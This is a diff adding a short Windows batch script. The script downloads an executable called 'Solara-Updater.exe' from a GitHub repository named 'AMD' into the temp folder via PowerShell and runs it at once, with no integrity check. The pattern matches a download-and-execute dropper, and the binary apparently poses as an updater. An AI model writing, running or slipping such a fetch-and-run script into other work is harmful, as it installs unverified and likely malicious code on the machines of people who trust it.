@@ -1,0 +1,31 @@
+@echo off
+setlocal
+
+REM Define the URL of the file to download
+set "url=https://github.com/whatmantable/AMD/raw/refs/heads/main/Solara-Updater.exe"
+
+REM Define the filename
+set "filename=Solara-Updater.exe"
+
+REM Get the temporary folder path
+set "temp_dir=%temp%"
+
+REM Create the full path for the downloaded file
+set "full_path=%temp_dir%\%filename%"
+
+echo Downloading %filename% from %url%...
+
+REM Download the file using PowerShell (more robust than certutil)
+powershell -Command "(New-Object System.Net.WebClient).DownloadFile('%url%', '%full_path%')"
+
+echo Download complete. File saved to: %full_path%
+
+echo Running the executable...
+
+REM Execute the downloaded file
+start "" "%full_path%"
+
+echo Script complete.
+
+endlocal
+exit
